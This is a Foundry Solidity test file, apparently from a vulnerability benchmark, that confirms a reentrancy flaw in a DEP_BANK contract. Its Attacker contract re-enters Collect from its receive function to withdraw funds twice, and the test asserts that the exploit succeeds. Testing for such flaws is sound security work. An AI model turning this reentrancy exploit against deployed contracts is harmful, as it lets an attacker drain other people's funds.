
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {DEP_BANK, LogFile} from "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {

    DEP_BANK public _contractUnderTest;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        _contractUnderTest = new DEP_BANK();
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.SetLogFile(address(log));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 depositVal) public {
        
        vm.assume(attackVal >= 1);
        vm.assume(depositVal >= 2 * attackVal);
        vm.assume(depositVal < type(uint128).max);
        vm.assume(attackVal < type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), depositVal * 2); 
        
        vm.deal(address(_attacker), depositVal * 2);

        vm.deal(address(this), depositVal * 2);

        _attacker.setupAttack{value: depositVal}(depositVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = DEP_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedAttackVal = val;

        _victim.Collect(val);

        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
            attackCallCount++;
        }
    }
}
